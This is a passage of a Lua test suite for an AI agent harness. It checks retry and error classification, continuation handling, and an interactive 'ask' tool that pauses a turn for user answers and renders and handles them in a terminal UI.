  assert_eq(msg11b, "interrupted by user", "T120 the fallback error explains itself")

  -- 12. the policy has no retry for the interrupted kind at all
  local p = policy.policy({ retry = { base_delay_ms = 1 } })
  local verdict = policy.verdict(p, policy.new_state(), policy.failure("interrupted", "interrupted by user"))
  assert_eq(verdict.action, "stop", "T120 interrupted stops the retry loop")
  assert_eq(policy.is_retryable("interrupted"), false, "T120 interrupted is not retryable")
  assert_eq(policy.reason("interrupted"), "interrupted by user", "T120 interrupted has a reason")

  _G.tether.abort_requested = saved_abort
  _G.tether.clear_abort = saved_clear
  _G.context = saved_context
  print("T117 turn retry and continuation: OK")
  print("T120 host interrupt delivery: OK")
end)

-- T115: retry policy — classification, schedule, cutoff, continuation.
do
  local policy = assert(loadfile("src/tether/retry.lua"))()

  -- classification: text beats status, quota and permanent stop the loop
  assert_eq(policy.classify("invalid api key"), "permanent", "T115 invalid api key")
  assert_eq(policy.classify("The model 'gpt-9' does not exist"), "permanent", "T115 unknown model")
  assert_eq(policy.classify("Unauthorized"), "permanent", "T115 unauthorized text")
  assert_eq(policy.classify("something odd", 401), "permanent", "T115 401 permanent")
  assert_eq(policy.classify("something odd", 403), "permanent", "T115 403 permanent")
  assert_eq(policy.classify("You've hit your limit \194\183 resets in 3 hours"), "quota", "T115 usage limit")
  assert_eq(policy.classify("You exceeded your current quota, please check your plan"), "quota", "T115 plan quota")
  assert_eq(policy.classify("Your account is suspended"), "quota", "T115 suspended account")
  assert_eq(policy.classify("insufficient_quota", 429), "quota", "T115 quota beats the 429 status")
  assert_eq(policy.classify("Insufficient Balance", 402), "credit", "T115 balance stays retryable")
  assert_eq(policy.classify("Not Enough Credits"), "credit", "T115 credits")
  assert_eq(policy.classify("ECONNRESET"), "connection", "T115 connection error")
  assert_eq(policy.classify("Max outbound streams is 100, 100 open"), "connection", "T115 stream exhaustion")
  assert_eq(policy.classify("context_length_exceeded", 400), "request", "T115 context 400 retryable")
  assert_eq(policy.classify("payload too large", 413), "request", "T115 413")
  assert_eq(policy.classify("OVERLOADED"), "server", "T115 case-insensitive")
  assert_eq(policy.classify(nil, 429), "server", "T115 status alone")
  assert_eq(policy.classify(""), "empty", "T115 empty body")
  assert_eq(policy.classify("something nobody has seen"), "unknown", "T115 catch-all")
  assert_true(policy.is_retryable("unknown"), "T115 unknown is retryable")
  assert_true(policy.is_retryable("empty"), "T115 empty is retryable")
  assert_false(policy.is_retryable("permanent"), "T115 permanent not retryable")
  assert_false(policy.is_retryable("quota"), "T115 quota not retryable")

  -- schedule: defaults and the cap
  local p = policy.policy({})
  assert_eq(p.base_delay_ms, 2000, "T115 default base")
  assert_eq(p.max_delay_ms, 60000, "T115 default max")
  assert_eq(p.multiplier, 2, "T115 default multiplier")
  assert_eq(p.max_failures_at_max_delay, 3, "T115 default max failures")
  assert_eq(policy.wait(p, 1), 2, "T115 first wait")
  assert_eq(policy.wait(p, 5), 32, "T115 fifth wait")
  assert_eq(policy.wait(p, 6), 60, "T115 sixth wait is capped")
  assert_eq(policy.wait(p, 8), 60, "T115 later waits stay capped")

  -- cutoff with defaults: nine attempts, three waits at the cap
  local state = policy.new_state()
  local attempts, verdict = 0, nil
  while true do
    attempts = attempts + 1
    verdict = policy.verdict(p, state, policy.failure("server", "overloaded"))
    if verdict.action ~= "retry" then break end
    state.attempt = state.attempt + 1
  end
  assert_eq(attempts, 9, "T115 nine attempts before the cutoff")
  assert_eq(state.failures_at_max_delay, 3, "T115 three waits at the cap")
  assert_eq(verdict.action, "stop", "T115 cutoff stops the loop")

  -- a retried attempt reports its wait; a non-retryable one never waits
  local first = policy.verdict(p, policy.new_state(), policy.failure("server", "rate limit"))
  assert_eq(first.action, "retry", "T115 first failure retries")
  assert_eq(first.delay, 2, "T115 first delay")
  assert_eq(policy.verdict(p, policy.new_state(), policy.failure("permanent", "invalid api key")).action,
    "stop", "T115 permanent stops at once")
  assert_eq(policy.verdict(p, policy.new_state(), policy.failure("quota", "out of budget")).action,
    "stop", "T115 quota stops at once")

  -- attempt cap
  local capped = policy.policy({ retry = { max_attempts = 3 } })
  local st2 = policy.new_state()
  for i = 1, 3 do
    local v = policy.verdict(capped, st2, policy.failure("server", "rate limit"))
    if i < 3 then assert_eq(v.action, "retry", "T115 under the cap retries")
    else assert_eq(v.action, "stop", "T115 cap stops the loop") end
    st2.attempt = st2.attempt + 1
  end

  -- Retry-After changes the wait, not the cutoff bookkeeping
  local st4 = policy.new_state()
  local v4 = policy.verdict(p, st4, policy.failure("server", "rate limit", 429, 5))
  assert_eq(v4.delay, 5, "T115 retry_after overrides the wait")
  assert_eq(st4.failures_at_max_delay, 0, "T115 retry_after is not a capped wait")

  -- invalid configuration falls back per value
  local junk = policy.policy({ retry = { base_delay_ms = 0, multiplier = 0.5,
                                         max_failures_at_max_delay = "three" } })
  assert_eq(junk.base_delay_ms, 2000, "T115 zero base falls back")
  assert_eq(junk.multiplier, 1, "T115 multiplier below 1 becomes 1")
  assert_eq(junk.max_failures_at_max_delay, 3, "T115 junk falls back")
  local junk2 = policy.policy({ retry = { base_delay_ms = "soon" } })
  assert_eq(junk2.base_delay_ms, 2000, "T115 malformed base falls back")
  local scaled = policy.policy({ retry = { base_delay_ms = 1000, multiplier = 3 } })
  assert_eq(policy.wait(scaled, 1), 1, "T115 custom first wait")
  assert_eq(policy.wait(scaled, 2), 3, "T115 custom second wait")

  -- continuation policy
  local st5 = policy.new_state()
  assert_eq(policy.continuation_action(st5, "length", true, false), "length", "T115 truncation continues")
  assert_eq(policy.continuation_action(st5, "length", true, true), nil, "T115 tool calls win over truncation")
  assert_eq(policy.continuation_action(st5, "stop", false, false), "empty", "T115 empty answer is nudged")
  assert_eq(policy.continuation_action(st5, "stop", false, false), "empty_giveup", "T115 only one nudge")
  policy.reset(st5)
  assert_eq(policy.continuation_action(st5, "stop", false, false), "empty", "T115 reset restores the nudge")
  assert_eq(policy.continuation_action(st5, "stop", true, false), nil, "T115 text ends the turn")
  assert_eq(policy.continuation_action(st5, "other", false, false), nil, "T115 unmapped reason ends the turn")
  assert_eq(policy.continuation_text("length"), policy.CONTINUE_TEXT, "T115 continuation text")
  assert_eq(policy.continuation_text("empty"), policy.EMPTY_TEXT, "T115 nudge text")
  assert_true(#policy.CONTINUE_TEXT > 0 and #policy.EMPTY_TEXT > 0, "T115 texts are non-empty")

  -- terminal messages
  assert_true(policy.terminal_message(policy.failure("server", "overloaded"), 9)
      :find("9 attempts", 1, true) ~= nil, "T115 exhaustion names the attempt count")
  assert_true(policy.terminal_message(policy.failure("quota", "You've hit your limit"), 2)
      :find("retries stopped", 1, true) ~= nil, "T115 quota explains the stop")
  assert_eq(policy.terminal_message(policy.failure("permanent", "invalid api key"), 1),
    "invalid api key", "T115 permanent surfaces the provider text")

  print("T115 retry policy: OK")
end

-- T121: the ask module — question normalisation and the answer payload
-- (add-ask-tool). Pure data in → data out: no UI, no transport, no turn.
do
  local askmod = assert(loadfile("src/tether/ask.lua"))()
  local common = assert(loadfile("src/tether/providers/common.lua"))()

  -- --- 1.1 normalisation ---------------------------------------------------
  local qs = askmod.normalize({ questions = {
    { id = "scope", question = "Scope?",
      options = { { label = "src" }, { label = "all" } } },
    { id = "priority", question = "Priority?", multi = true, recommended = 2,
      description = "Choose the focus",
      options = { { label = "core", description = "first" }, { label = "tests" } } },
  } })
  assert_eq(#qs, 2, "T121 two questions survive in order")
  assert_eq(qs[1].id, "scope", "T121 first id")
  assert_eq(qs[2].id, "priority", "T121 second id")
  assert_true(qs[2].multi, "T121 multi is kept")
  assert_eq(qs[2].recommended, 2, "T121 recommended is kept")
  assert_eq(qs[2].description, "Choose the focus", "T121 description is kept")
  assert_eq(qs[2].options[1].description, "first", "T121 option description is kept")
  assert_false(qs[1].multi, "T121 multi defaults to false")
  assert_eq(qs[1].recommended, nil, "T121 absent recommended stays nil")

  -- a bare questions array (not wrapped in {questions=...}) is accepted too
  assert_eq(#askmod.normalize({ { question = "flat" } }), 1, "T121 unwrapped array works")

  -- bounds: 8 questions, 12 options, truncated text
  local many = {}
  for i = 1, 9 do many[i] = { question = "q" .. i } end
  assert_eq(#askmod.normalize({ questions = many }), 8, "T121 9 questions → 8")
  local opts = {}
  for i = 1, 13 do opts[i] = { label = "o" .. i } end
  local capped = askmod.normalize({ questions = { { question = "cap", options = opts } } })
  assert_eq(#capped[1].options, 12, "T121 13 options → 12")
  assert_eq(capped[1].options[12].label, "o12", "T121 the first 12 options survive")
  local big = askmod.normalize({ questions = { {
      question = string.rep("x", 1200), description = string.rep("y", 9000) } } })
  assert_eq(#big[1].question, askmod.QUESTION_MAX + #askmod.TRUNCATION,
    "T121 oversized question text is truncated")
  assert_eq(#big[1].description, askmod.DESCRIPTION_MAX + #askmod.TRUNCATION,
    "T121 oversized description is truncated")

  -- degradation: nothing usable is dropped, the rest still asks
  local degraded = askmod.normalize({ questions = {
    { question = "no id", options = {} },
    { question = "   " },
    { question = "dup", id = "scope", options = { { label = "" }, "ok", { label = 7 } } },
    { question = "again", id = "scope" },
    { question = "junk", multi = "yes", recommended = 9, options = { { label = "a" } } },
  } })
  assert_eq(#degraded, 4, "T121 only questions with text survive")
  assert_eq(degraded[1].id, "q1", "T121 a missing id is defaulted")
  assert_eq(#degraded[1].options, 0, "T121 an optionless question still asks")
  assert_eq(#degraded[2].options, 1, "T121 unusable option labels are dropped")
  assert_eq(degraded[2].options[1].label, "ok", "T121 a bare string option is accepted")
  assert_eq(degraded[3].id, "scope-2", "T121 duplicate ids become distinct")
  assert_eq(degraded[4].multi, false, "T121 a non-boolean multi is false")
  assert_eq(degraded[4].recommended, nil, "T121 an out-of-range recommended is ignored")
  assert_eq(#askmod.normalize({}), 0, "T121 an empty call carries nothing")
  assert_eq(#askmod.normalize("nonsense"), 0, "T121 a non-table argument carries nothing")

  -- --- 1.2 payload, notes, summary ----------------------------------------
  local payload = askmod.encode(qs, {
    { selected = { "src" } },
    { selected = { "core", "tests" }, notes = { ["tests"] = "after core" } },
  })
  assert_true(payload:find('"selected":["src"]', 1, true) ~= nil,
    "T121 a single choice is one array element")
  assert_true(payload:find('"selected":["core","tests"]', 1, true) ~= nil,
    "T121 a multi answer carries every toggle")
  -- (the encoder emits object keys in `pairs` order, so match the members)
  assert_true(payload:find('"notes":[{', 1, true) ~= nil,
    "T121 notes travel as an array of pairs")
  assert_true(payload:find('"option":"tests"', 1, true) ~= nil
    and payload:find('"note":"after core"', 1, true) ~= nil,
    "T121 notes travel as option/note pairs")
  local decoded = common.json_decode(payload)
  assert_eq(type(decoded), "table", "T121 the payload is valid JSON")
  assert_eq(decoded.answers[1].id, "scope", "T121 answers keep the question order")
  assert_eq(decoded.answers[2].id, "priority", "T121 second answer id")
  assert_eq(decoded.answers[1].selected[1], "src", "T121 labels are verbatim")
  assert_eq(decoded.answers[2].notes[1].option, "tests", "T121 the note is keyed by its option")
  assert_eq(decoded.answers[1].other, nil, "T121 an empty freeform field is omitted")

  -- freeform-only answer: selected is [] and the text rides in `other`
  local free = askmod.encode(qs, { { selected = {}, other = "Nuxt" } })
  assert_true(free:find('"selected":[]', 1, true) ~= nil,
    "T121 an empty selection encodes as an array")
  assert_true(free:find('"other":"Nuxt"', 1, true) ~= nil, "T121 the freeform text is in other")
  local free_decoded = common.json_decode(free)
  assert_eq(#free_decoded.answers[1].selected, 0, "T121 freeform-only has no selection")
  assert_eq(free_decoded.answers[1].other, "Nuxt", "T121 freeform text round-trips")

  -- a note on an unselected option still travels, and survives a freeform answer
  local noted = askmod.encode(qs, {
    { selected = { "src" }, notes = { ["all"] = "too big" } },
    { selected = {}, other = "both", notes = { ["core"] = "with tests" } },
  })
  local noted_decoded = common.json_decode(noted)
  assert_eq(noted_decoded.answers[1].notes[1].option, "all", "T121 an unselected option's note travels")
  assert_eq(noted_decoded.answers[1].selected[1], "src", "T121 the note is not an answer")
  assert_eq(noted_decoded.answers[2].notes[1].option, "core", "T121 notes survive a freeform answer")

  -- summary names each id with its selection, freeform text and notes
  local sum = askmod.summary(qs, {
    { selected = { "src" }, notes = { ["all"] = "too big" } },
    { selected = { "core", "tests" } },
  })
  assert_true(sum:find("scope=src", 1, true) ~= nil, "T121 the summary names the id and selection")
  assert_true(sum:find("priority=core, tests", 1, true) ~= nil, "T121 the summary names a multi answer")
  assert_true(sum:find("scope/all: too big", 1, true) ~= nil, "T121 the summary names the notes")
  local sum_free = askmod.summary(qs, { { selected = {}, other = "Nuxt" } })
  assert_true(sum_free:find("scope=«Nuxt»", 1, true) ~= nil, "T121 the summary names a freeform answer")

  -- cancellation payload: an empty answer set that names the cancellation
  local cancelled = common.json_decode(askmod.cancelled_payload())
  assert_true(cancelled.cancelled == true, "T121 the cancellation names itself")
  assert_eq(#cancelled.answers, 0, "T121 the cancellation carries no answers")

  print("T121 ask module: OK")
end

-- T122: both built-in tool descriptions list the same tools (add-ask-tool 2.1).
-- agent.builtin_prompt is the fallback base prompt, context.BUILTIN_PROMPT is
-- the base context.compose actually builds, so a tool listed in only one of
-- them is invisible in half the runs.
do
  local agent = assert(loadfile("src/tether/agent.lua"))()
  local context = assert(loadfile("src/tether/context.lua"))()

  local function listing(text)
    local names = {}
    for name in (text or ""):gmatch("\n%- ([%w_]+)%(") do names[#names + 1] = name end
    return names
  end

  local a, c = listing(agent.builtin_prompt), listing(context.builtin_prompt)
  assert_true(#a > 0, "T122 the built-in prompt lists tools")
  assert_eq(table.concat(a, ","), table.concat(c, ","),
    "T122 the two built-in tool listings agree")
  local joined = "," .. table.concat(a, ",") .. ","
  assert_true(joined:find(",ask,", 1, true) ~= nil, "T122 the listings name ask")
  assert_true(joined:find(",patch,", 1, true) ~= nil, "T122 the listings name the existing tools")
  assert_true((agent.builtin_prompt or ""):find("ask(questions)", 1, true) ~= nil,
    "T122 the ask entry shows its argument shape")
  print("T122 built-in tool listings: OK")
end

-- T123: ask parks the turn and the answer resumes it (add-ask-tool 2.2/2.3).
-- Agent level: a stubbed stream emits the tool calls, and the turn is resolved
-- the way the UI resolves it — answer_ask(...) then continue.
do
  local ASK_WS = "/tmp/tether_ask_t123a"
  os.execute("rm -rf " .. ASK_WS .. " && mkdir -p " .. ASK_WS)
  with_modules(base_env, function(mods)
    local agent = mods.agent
    local cfg = { workspace = ASK_WS, _session_id = "s1", auto_approve = {} }
    local journal = {}
    mods.session.append = function(_, ev) journal[#journal + 1] = ev end
    local requests, events = 0, {}
    local function on_ev(ev) events[#events + 1] = ev end
    mods.api.stream = function(c, key, messages, on_event)
      requests = requests + 1
      if requests == 1 then
        on_event({ type = "tool_call_start", id = "a1", name = "ask" })
        on_event({ type = "tool_call_delta", id = "a1",
          arguments = '{"questions":[{"id":"scope","question":"Scope?",'
            .. '"options":[{"label":"src"},{"label":"all"}]}]}' })
        on_event({ type = "tool_call_start", id = "w1", name = "write" })
        on_event({ type = "tool_call_delta", id = "w1",
          arguments = '{"path":"out.txt","content":"written\\n"}' })
      else
        on_event({ type = "text_delta", text = "done" })
      end
      return true
    end

    local function tool_msgs()
      local n = 0
      for _, m in ipairs(agent.get_history()) do
        if m.role == "tool" then n = n + 1 end
      end
      return n
    end
    local function count_asks()
      local n = 0
      for _, ev in ipairs(events) do if ev.type == "ask" then n = n + 1 end end
      return n
    end

    agent.turn(cfg, "k", "which scope?", on_ev)

    local ask_ev
    for _, ev in ipairs(events) do if ev.type == "ask" then ask_ev = ev end end
    assert_notnil(ask_ev, "T123 the ask call raises an event")
    assert_eq(ask_ev and ask_ev.id, "a1", "T123 the event carries the call id")
    assert_eq(ask_ev and ask_ev.questions[1].id, "scope",
      "T123 the event carries the normalised questions")
    assert_eq(ask_ev and #ask_ev.questions[1].options, 2, "T123 the options survive normalisation")
    assert_eq(tool_msgs(), 0, "T123 nothing behind the ask runs while it is parked")
    assert_eq(requests, 1, "T123 the turn returned without another request")

    -- a repeated continue neither re-emits nor runs the queued call
    agent.continue(cfg, "k", on_ev)
    assert_eq(count_asks(), 1, "T123 continue does not re-emit the ask")
    assert_eq(tool_msgs(), 0, "T123 a call queued behind the ask still waits")
    assert_eq(requests, 1, "T123 the parked turn makes no request")

    -- the answer records the tool result, lets the queued call run, drains
    local more = agent.answer_ask("a1", { { selected = { "src" } } }, cfg, on_ev)
    assert_false(more, "T123 answering the last interaction drains the queue")

    local payload
    for _, m in ipairs(agent.get_history()) do
      if m.role == "tool" and m.tool_call_id == "a1" then payload = m.content end
    end
    assert_notnil(payload, "T123 the answer is that call's tool result")
    assert_true((payload or ""):find('"selected":["src"]', 1, true) ~= nil,
      "T123 the tool result carries the answer payload")

    local journaled = false
    for _, ev in ipairs(journal) do
      if ev.type == "tool_result" and ev.tool_call_id == "a1" then journaled = true end
    end
    assert_true(journaled, "T123 the answer is journaled")

    local wrote = false
    for _, m in ipairs(agent.get_history()) do
      if m.role == "tool" and m.tool_call_id == "w1" then wrote = true end
    end
    assert_true(wrote, "T123 the call queued behind the ask runs once it is answered")
    local f = io.open(ASK_WS .. "/out.txt", "r")
    assert_notnil(f, "T123 the queued write reached the disk")
    if f then f:close() end

    -- resuming sends the answer to the model and finishes the turn
    agent.continue(cfg, "k", on_ev)
    assert_eq(requests, 2, "T123 the resumed turn makes its next request")
    print("T123 ask parks the turn: OK")
  end)
end

-- T123b: cancelling resolves every queued ask of the step (add-ask-tool 2.4)
do
  local ASK_WS = "/tmp/tether_ask_t123b"
  os.execute("rm -rf " .. ASK_WS .. " && mkdir -p " .. ASK_WS)
  with_modules(base_env, function(mods)
    local agent = mods.agent
    local cfg = { workspace = ASK_WS, _session_id = "s1", auto_approve = {} }
    mods.session.append = function() end
    local requests, events = 0, {}
    local function on_ev(ev) events[#events + 1] = ev end
    mods.api.stream = function(c, key, messages, on_event)
      requests = requests + 1
      if requests == 1 then
        on_event({ type = "tool_call_start", id = "a1", name = "ask" })
        on_event({ type = "tool_call_delta", id = "a1",
          arguments = '{"questions":[{"id":"one","question":"One?"}]}' })
        on_event({ type = "tool_call_start", id = "a2", name = "ask" })
        on_event({ type = "tool_call_delta", id = "a2",
          arguments = '{"questions":[{"id":"two","question":"Two?"}]}' })
        on_event({ type = "tool_call_start", id = "w1", name = "write" })
        on_event({ type = "tool_call_delta", id = "w1",
          arguments = '{"path":"cancel.txt","content":"x\\n"}' })
      else
        on_event({ type = "text_delta", text = "ok" })
      end
      return true
    end

    local function count_asks()
      local n = 0
      for _, ev in ipairs(events) do if ev.type == "ask" then n = n + 1 end end
      return n
    end

    agent.turn(cfg, "k", "ask me twice", on_ev)
    assert_eq(count_asks(), 1, "T123b only the first question is raised")

    agent.answer_ask("a1", { cancelled = true }, cfg, on_ev)
    assert_eq(count_asks(), 1, "T123b the queued question is not raised after a cancel")

    local results = {}
    for _, m in ipairs(agent.get_history()) do
      if m.role == "tool" then results[m.tool_call_id] = m.content end
    end
    assert_true((results.a1 or ""):find('"cancelled":true', 1, true) ~= nil,
      "T123b the cancelled call reports the cancellation")
    assert_true((results.a2 or ""):find('"cancelled":true', 1, true) ~= nil,
      "T123b the queued call reports the same cancellation")
    assert_notnil(results.w1, "T123b the pending write is unaffected")
    local f = io.open(ASK_WS .. "/cancel.txt", "r")
    assert_notnil(f, "T123b the pending write reached the disk")
    if f then f:close() end
    print("T123b cancel resolves the batch: OK")
  end)
end

-- T123c: a non-interactive run gets an error result instead of a question
-- (add-ask-tool 2.5), and an unusable question set does too.
do
  with_modules(base_env, function(mods)
    local agent = mods.agent
    local cfg = { workspace = "/tmp/ws", _session_id = "s1", auto_approve = {},
                  non_interactive = true }
    mods.session.append = function() end
    local requests, events = 0, {}
    local function on_ev(ev) events[#events + 1] = ev end
    mods.api.stream = function(c, key, messages, on_event)
      requests = requests + 1
      if requests == 1 then
        on_event({ type = "tool_call_start", id = "a1", name = "ask" })
        on_event({ type = "tool_call_delta", id = "a1",
          arguments = '{"questions":[{"id":"q","question":"Which?"}]}' })
      else
        on_event({ type = "text_delta", text = "decided" })
      end
      return true
    end

    agent.turn(cfg, "k", "go", on_ev)
    assert_eq(requests, 2, "T123c the loop makes its next request without waiting")
    local saw_ask, saw_err = false, false
    for _, ev in ipairs(events) do
      if ev.type == "ask" then saw_ask = true end
      if ev.type == "tool_result" and ev.error
          and ev.error:find("no interactive user", 1, true) then saw_err = true end
    end
    assert_false(saw_ask, "T123c no question is raised")
    assert_true(saw_err, "T123c the call yields an error result")
    local content
    for _, m in ipairs(agent.get_history()) do
      if m.role == "tool" then content = m.content end
    end
    assert_true((content or "").find ~= nil
      and (content or ""):find("no interactive user", 1, true) ~= nil,
      "T123c the model reads the explanation")
    print("T123c non-interactive ask: OK")
  end)
end

do
  with_modules(base_env, function(mods)
    local agent = mods.agent
    local cfg = { workspace = "/tmp/ws", _session_id = "s1", auto_approve = {} }
    mods.session.append = function() end
    local requests, events = 0, {}
    local function on_ev(ev) events[#events + 1] = ev end
    mods.api.stream = function(c, key, messages, on_event)
      requests = requests + 1
      if requests == 1 then
        on_event({ type = "tool_call_start", id = "a1", name = "ask" })
        on_event({ type = "tool_call_delta", id = "a1",
          arguments = '{"questions":[{"question":"   "}]}' })
      else
        on_event({ type = "text_delta", text = "decided" })
      end
      return true
    end

    agent.turn(cfg, "k", "go", on_ev)
    assert_eq(requests, 2, "T123d an unusable question set keeps the loop going")
    local saw_ask, saw_err = false, false
    for _, ev in ipairs(events) do
      if ev.type == "ask" then saw_ask = true end
      if ev.type == "tool_result" and ev.error
          and ev.error:find("no usable question", 1, true) then saw_err = true end
    end
    assert_false(saw_ask, "T123d nothing answerable raises no question")
    assert_true(saw_err, "T123d the tool result names the problem")
    print("T123d unusable question set: OK")
  end)
end

-- T124: the question block renders from an ask event (add-ask-tool 3.1).
do
  local askmod = assert(loadfile("src/tether/ask.lua"))()
  local agent_stub = { turn = function() return true end, get_history = function() return {} end,
                       answer_ask = function() return false end, continue = function() return true end }
  local uimod, S = run_ui_with({ 17 }, { agent = agent_stub })

  -- a waiting turn first: the block must take the placeholder's place
  S.waiting = true
  uimod._sync_tail()
  assert_notnil(tph(uimod), "T124 the placeholder is up before the question")

  uimod._handle_agent_event({ type = "ask", id = "a1", questions = {
    { id = "scope", question = "Which scope?", description = "Pick exactly one.",
      recommended = 2,
      options = { { label = "src", description = "only src" }, { label = "all" } } },
  } })
  assert_notnil(S.ask, "T124 the event opens the block")
  assert_notnil(task(uimod), "T124 the block is a synthetic tail entry")
  assert_eq(S.busy, false, "T124 the turn is not busy while the user answers")
  assert_eq(S.waiting, false, "T124 the waiting state is cleared")
  assert_eq(tph(uimod), nil, "T124 no placeholder is painted under the block")

  local rows = uimod._render_all(80)
  local joined = table.concat(rows, "\n")
  assert_true(joined:find("Which scope?", 1, true) ~= nil, "T124 the question text is rendered")
  assert_true(joined:find("? ", 1, true) ~= nil, "T124 the block leads with the question row")
  assert_true(joined:find("Pick exactly one.", 1, true) ~= nil, "T124 the description is rendered as context")
  assert_true(joined:find("1. src", 1, true) ~= nil, "T124 option rows carry their index")
  assert_true(joined:find("2. all", 1, true) ~= nil, "T124 the second option is rendered")
  assert_true(joined:find("only src", 1, true) ~= nil, "T124 an option description is rendered")
  assert_true(joined:find("(рекомендуется)", 1, true) ~= nil, "T124 the recommended option is flagged")
  assert_true(joined:find(askmod.FREEFORM_LABEL, 1, true) ~= nil, "T124 the freeform row is always present")
  assert_true(joined:find("(", 1, true) ~= nil, "T124 the block renders rows")

  -- the highlight starts on the first option, not on the recommended one
  local highlighted, recommended_row = nil, nil
  for _, r in ipairs(rows) do
    if r:find("\27[7m", 1, true) then highlighted = r end
    if r:find("(рекомендуется)", 1, true) then recommended_row = r end
  end
  assert_notnil(highlighted, "T124 a row is highlighted")
  assert_true(highlighted and highlighted:find("1. src", 1, true) ~= nil,
    "T124 the initial highlight stays on the first option")
  assert_true(recommended_row ~= nil and recommended_row:find("2. all", 1, true) ~= nil,
    "T124 the recommended flag sits on option 2")

  -- progress appears only for a multi-question call
  local uimod2, S2 = run_ui_with({ 17 }, { agent = agent_stub })
  local three = {}
  for i = 1, 3 do
    three[i] = { id = "q" .. i, question = "Question " .. i,
                 options = { { label = "a" }, { label = "b" } } }
  end
  uimod2._handle_agent_event({ type = "ask", id = "a2", questions = three })
  local joined2 = table.concat(uimod2._render_all(80), "\n")
  assert_true(joined2:find("Question 1", 1, true) ~= nil, "T124 the first question is shown")
  assert_true(joined2:find("(1/3)", 1, true) ~= nil, "T124 a multi-question call shows its progress")
  assert_true(joined2:find("Question 2", 1, true) == nil, "T124 the next question waits its turn")

  -- a multi question marks every option, and a saved note renders under its option
  S2.ask.questions[1].multi = true
  S2.ask.answers[1].selected = { "a" }
  S2.ask.answers[1].notes = { b = "second choice" }
  uimod2._sync_tail()
  local joined3 = table.concat(uimod2._render_all(80), "\n")
  assert_true(joined3:find("[x] 1. a", 1, true) ~= nil, "T124 a toggled option is marked")
  assert_true(joined3:find("[ ] 2. b", 1, true) ~= nil, "T124 an untoggled option is marked too")
  assert_true(joined3:find("second choice", 1, true) ~= nil, "T124 a note renders under its option")

  -- a single-question call shows no progress indicator at all
  local uimod3, S3 = run_ui_with({ 17 }, { agent = agent_stub })
  uimod3._handle_agent_event({ type = "ask", id = "a3", questions = {
    { id = "one", question = "Only one?", options = { { label = "x" } } } } })
  local joined4 = table.concat(uimod3._render_all(80), "\n")
  assert_true(joined4:find("(1/1)", 1, true) == nil, "T124 a single question has no progress indicator")
  print("T124 question block rendering: OK")
end

-- T125: answering a question with the keyboard (add-ask-tool 3.2).
do
  local rec = { continued = 0 }
  local agent_stub = {
    turn = function() return true end,
    get_history = function() return {} end,
    answer_ask = function(id, answer) rec.id = id; rec.answer = answer; return false end,
    continue = function() rec.continued = rec.continued + 1; return true end,
  }
  local function boot(questions)
    local uimod, S = run_ui_with({ 17 }, { agent = agent_stub })
    -- the harness restores globals after run(); resolving an answer calls into
    -- the agent again, so the stub has to be reachable for the post-run keys
    _G.agent = agent_stub
    uimod._handle_agent_event({ type = "ask", id = "a1", questions = questions })
    return uimod, S
  end
  local down  = { kind = "special", name = "down" }
  local left  = { kind = "special", name = "left" }
  local enter = { kind = "enter" }
  local esc   = { kind = "esc" }
  local function text(c) return { kind = "text", char = c } end
  local one = { { id = "scope", question = "Scope?",
                  options = { { label = "src" }, { label = "all" }, { label = "none" } } } }

  -- arrow + Enter picks the highlighted option
  local m, S = boot(one)
  m._handle_key(down)
  assert_eq(S.ask.sel, 2, "T125 ↓ moves the highlight")
  m._handle_key(enter)
  assert_notnil(rec.answer, "T125 Enter submits the highlighted option")
  assert_eq(rec.answer[1].selected[1], "all", "T125 the second option is the answer")
  assert_eq(S.ask, nil, "T125 the block closes on submit")
  assert_eq(rec.continued, 1, "T125 the turn resumes after the answer")
  local row
  for _, e in ipairs(tentries(m)) do
    if e.role == "system" and (e.text or ""):find("→ ask:", 1, true) then row = e.text end
  end
  assert_notnil(row, "T125 a summary row is appended")
  assert_true(row and row:find("scope=all", 1, true) ~= nil, "T125 the row names the answer")

  -- a digit submits that option
  rec.answer = nil
  local m2 = boot(one)
  m2._handle_key(text("3"))
  assert_notnil(rec.answer, "T125 a digit submits")
  assert_eq(rec.answer[1].selected[1], "none", "T125 the third option is the answer")

  -- keys the block does not use change nothing and never reach the input line
  rec.answer = nil
  local m3, S3 = boot(one)
  local input_before = S3.input
  m3._handle_key(text("z"))
  m3._handle_key(text("7"))
  assert_eq(S3.input, input_before, "T125 unused keys do not reach the input line")
  assert_eq(rec.answer, nil, "T125 nothing is submitted")
  assert_notnil(S3.ask, "T125 the block stays open")

  -- Esc cancels the set, raises no banner, and the turn continues
  local m4, S4 = boot(one)
  local before_cancel = rec.continued
  m4._handle_key(esc)
  assert_true(rec.answer and rec.answer.cancelled == true, "T125 Esc reports the cancellation")
  assert_eq(S4.ask, nil, "T125 the block is gone after Esc")
  assert_eq(S4.error_banner, nil, "T125 a cancellation raises no error banner")
  assert_eq(rec.continued, before_cancel + 1, "T125 the turn continues after a cancellation")

  -- multi: Space toggles without submitting, Enter accepts the selection
  rec.answer = nil
  local multi = { { id = "cons", question = "Constraints?", multi = true,
                    options = { { label = "no breaks" }, { label = "zero deps" } } } }
  local m5, S5 = boot(multi)
  m5._handle_key(text(" "))
  m5._handle_key(down)
  m5._handle_key(text(" "))
  assert_eq(rec.answer, nil, "T125 a toggle does not submit")
  assert_eq(#S5.ask.answers[1].selected, 2, "T125 two options are toggled")
  m5._handle_key(text(" "))
  assert_eq(#S5.ask.answers[1].selected, 1, "T125 Space toggles the highlight off again")
  m5._handle_key(enter)
  assert_notnil(rec.answer, "T125 Enter accepts the multi selection")
  assert_eq(#rec.answer[1].selected, 1, "T125 the accepted selection is reported")

  -- ← returns to the previous question with its answer intact
  rec.answer = nil
  local two = {
    { id = "q1", question = "First?", options = { { label = "a" }, { label = "b" } } },
    { id = "q2", question = "Second?", options = { { label = "c" }, { label = "d" } } } }
  local m6, S6 = boot(two)
  m6._handle_key(enter)
  assert_eq(S6.ask.qidx, 2, "T125 Enter advances to the next question")
  assert_eq(rec.answer, nil, "T125 the set is not submitted before its last question")
  assert_eq(S6.ask.answers[1].selected[1], "a", "T125 the earlier answer is kept while advancing")
  m6._handle_key(left)
  assert_eq(S6.ask.qidx, 1, "T125 ← returns to the previous question")
  assert_eq(S6.ask.answers[1].selected[1], "a", "T125 the answer is still selected")
  m6._handle_key(enter)
  m6._handle_key(enter)
  assert_notnil(rec.answer, "T125 the last question submits the whole set")
  assert_eq(#rec.answer, 2, "T125 both answers are reported")

  -- the waiting state stays clear while the block is open
  local m7, S7 = boot(one)
  local ph125 = tph(m7)
  assert_eq(ph125, nil, "T125 no placeholder under the block")
  assert_eq(S7.waiting, false, "T125 the turn is not painted as waiting")
  print("T125 question block keys: OK")
end

